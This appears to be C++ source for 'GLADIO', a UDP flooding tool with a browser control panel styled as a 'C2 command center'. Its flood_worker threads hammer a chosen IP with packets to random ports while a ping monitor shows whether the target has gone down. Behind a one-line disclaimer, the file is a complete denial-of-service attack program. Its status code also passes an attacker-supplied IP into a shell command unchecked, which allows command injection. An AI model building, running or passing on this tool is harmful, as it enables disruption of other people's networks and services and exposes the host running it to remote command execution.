/* * Project: GLADIO - Dual-Channel Network Auditor
 * Developer: aimparator
 * Features: Independent Flooding & Real-Time ICMP Monitoring
 * * [!] Educational and authorized testing only.
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <chrono>
#include <random>
#include <algorithm>
#include <cstring>
#include <sstream>
#include <csignal>
#include <cstdio>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    using SOCKET_TYPE = SOCKET;
    #define CLOSE_SOCKET(s) closesocket(s)
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    using SOCKET_TYPE = int;
    #define CLOSE_SOCKET(s) ::close(s)
    #define INVALID_SOCKET_VAL (-1)
#endif

// === GLOBAL STATE MANAGEMENT ===
std::atomic<bool> g_stop_event{false};       // Global server shutdown flag
std::atomic<bool> g_is_running{false};      // Attack status flag
std::atomic<uint64_t> g_packet_counter{0};   // Total packets sent counter
std::mutex g_params_mutex;                   // Mutex for thread-safe IP updates
std::vector<std::thread> g_threads;          // Worker threads container
SOCKET_TYPE g_server_socket = -1;            // Main web server socket

// === DUAL TARGET CONFIGURATION ===
std::string g_flood_ip = "127.0.0.1";        // Target for the UDP Flood
std::string g_monitor_ip = "8.8.8.8";        // Target for the Latency Monitor
int g_threads_count = 200;

// === REAL LATENCY CHECKER (ICMP) ===
// This function executes a system ping to get real-world millisecond data
std::string get_real_ping(std::string ip) {
    char buffer[128];
    std::string result = "";
    // Command for Linux: 1 packet, 1 second timeout, extract time value
    std::string cmd = "ping -c 1 -W 1 " + ip + " | grep 'time=' | awk -F'time=' '{print $2}' | awk '{print $1}'";
    
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "ERR";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) result += buffer;
    pclose(pipe);

    if (result.empty()) return "TIMEOUT";
    result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
    return result + " ms";
}

// === WEB INTERFACE (Original Dark/Blue Theme) ===
const std::string html_content = R"HTMLJS(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AIMPARATOR | GLADIO C2</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b0e14; color: #e0e0e0; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 90%; max-width: 700px; background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        h1 { color: #58a6ff; letter-spacing: 3px; border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-bottom: 20px; }
        .section-title { color: #8b949e; text-align: left; font-size: 0.9em; text-transform: uppercase; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; }
        .controls { display: flex; gap: 10px; margin-top: 20px; }
        .btn { flex: 1; padding: 15px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-start { background: #238636; color: white; }
        .btn-stop { background: #da3633; color: white; }
        .btn:hover { opacity: 0.8; }
        .stats-box { background: #0d1117; padding: 15px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #58a6ff; font-size: 1.1em; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.9em; }
        th { text-align: left; color: #58a6ff; padding: 10px; border-bottom: 1px solid #30363d; }
        td { padding: 10px; border-bottom: 1px solid #21262d; font-family: 'Courier New', monospace; }
        .status-up { color: #3fb950; }
        .status-down { color: #f85149; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>GLADIO COMMAND CENTER</h1>
        <p style="text-align:right; font-size:0.8em; color:#8b949e;">Operator: <strong>aimparator</strong></p>

        <div class="section-title">Flood Configuration (UDP)</div>
        <input type="text" id="floodIp" value="127.0.0.1" placeholder="Attack Target IP">
        
        <div class="section-title">Network Monitor Configuration (ICMP)</div>
        <input type="text" id="monitorIp" value="8.8.8.8" placeholder="Monitor Target IP">

        <div class="controls">
            <button class="btn btn-start" onclick="sendCommand('start')">INITIATE OPERATIONS</button>
            <button class="btn btn-stop" onclick="sendCommand('stop')">HALT ALL</button>
        </div>

        <div class="stats-box">
            Sent Packets: <span id="pcount" style="color:#58a6ff">0</span>
        </div>

        <div class="section-title">Real-Time Proof of Work</div>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>Monitoring Target</th>
                    <th>Response</th>
                </tr>
            </thead>
            <tbody id="logBody"></tbody>
        </table>
    </div>

    <script>
        async function sendCommand(type) {
            const data = {
                flood_ip: document.getElementById('floodIp').value,
                monitor_ip: document.getElementById('monitorIp').value
            };
            await fetch('/api/' + type, { method: 'POST', body: JSON.stringify(data) });
        }

        async function updateData() {
            try {
                const res = await fetch('/api/status');
                const data = await res.json();
                document.getElementById('pcount').innerText = data.packets.toLocaleString();
                
                const table = document.getElementById('logBody');
                const row = table.insertRow(0);
                const isDown = data.latency.includes('TIMEOUT');
                
                row.innerHTML = `
                    <td>${new Date().toLocaleTimeString()}</td>
                    <td style="color:#8b949e">${data.current_monitor}</td>
                    <td class="${isDown ? 'status-down' : 'status-up'}">${data.latency}</td>
                `;
                if(table.rows.length > 8) table.deleteRow(8);
            } catch(e) {}
        }
        setInterval(updateData, 2500);
    </script>
</body>
</html>
)HTMLJS";

// === NETWORK WORKER (UDP FLOODER) ===
void flood_worker() {
    SOCKET_TYPE sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in target{};
    target.sin_family = AF_INET;
    
    {
        std::lock_guard<std::mutex> l(g_params_mutex);
        inet_pton(AF_INET, g_flood_ip.c_str(), &target.sin_addr);
    }
    
    char payload[1024]; 
    memset(payload, 0x41, 1024); // Fill with 'A's

    while(g_is_running.load()) {
        target.sin_port = htons(rand() % 65535 + 1);
        sendto(sock, payload, 1024, 0, (sockaddr*)&target, sizeof(target));
        g_packet_counter.fetch_add(1);
    }
    CLOSE_SOCKET(sock);
}

// === WEB SERVER LOGIC ===
void run_server() {
    g_server_socket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr{AF_INET, htons(8080), INADDR_ANY};
    bind(g_server_socket, (sockaddr*)&addr, sizeof(addr));
    listen(g_server_socket, 5);
    
    std::cout << "[+] GLADIO C2 System Online\n";
    std::cout << "[+] Access Point: http://localhost:8080\n";

    while(!g_stop_event) {
        SOCKET_TYPE client = accept(g_server_socket, NULL, NULL);
        if(client == -1) continue;

        char buffer[2048] = {0};
        recv(client, buffer, 2048, 0);
        std::string req(buffer);
        std::string resp;

        if(req.find("GET /api/status") != std::string::npos) {
            // Monitor actual latency of the specific monitor IP
            std::string lat = get_real_ping(g_monitor_ip);
            
            resp = std::string("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n") +
                   "{\"packets\":" + std::to_string(g_packet_counter.load()) + 
                   ",\"current_monitor\":\"" + g_monitor_ip + "\"" +
                   ",\"latency\":\"" + lat + "\"}";
        }
        else if(req.find("POST /api/start") != std::string::npos) {
            // Extract IPs from request (simplified logic)
            size_t f_pos = req.find("\"flood_ip\":\"");
            size_t m_pos = req.find("\"monitor_ip\":\"");
            if(f_pos != std::string::npos && m_pos != std::string::npos) {
                std::lock_guard<std::mutex> l(g_params_mutex);
                // Simple parsing
                std::string sub_f = req.substr(f_pos + 12);
                g_flood_ip = sub_f.substr(0, sub_f.find("\""));
                std::string sub_m = req.substr(m_pos + 14);
                g_monitor_ip = sub_m.substr(0, sub_m.find("\""));
            }

            if(!g_is_running) {
                g_is_running = true;
                g_packet_counter = 0;
                for(int i=0; i<g_threads_count; i++) g_threads.emplace_back(flood_worker);
            }
            resp = "HTTP/1.1 200 OK\r\n\r\n";
        }
        else if(req.find("POST /api/stop") != std::string::npos) {
            g_is_running = false;
            for(auto& t : g_threads) if(t.joinable()) t.join();
            g_threads.clear();
            resp = "HTTP/1.1 200 OK\r\n\r\n";
        }
        else {
            resp = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" + html_content;
        }
        send(client, resp.c_str(), (int)resp.size(), 0);
        CLOSE_SOCKET(client);
    }
}

int main() {
    // Catch CTRL+C to close sockets properly
    signal(SIGINT, [](int){ 
        std::cout << "\n[!] Shutting down...\n";
        g_stop_event = true; 
        exit(0); 
    });

    std::cout << R"(
    =============================================
    |  _____ _      ___  _____ _____ ____       |
    | / ____| |    / _ \|  __ \_   _/ __ \      |
    | | |  __| |   | |_| | |  | || || |  | |    |
    | | |_ | |   |  _  | |  | || || |  | |     |
    | |__| | |___| | | | |__| || || |__| |     |
    | \_____|______|_| |_|_____/_____\____/     |
    =============================================
    [OPERATOR] aimparator
    [TARGET]   Network Resilience Analysis
    )" << std::endl;

    run_server();
    return 0;
}
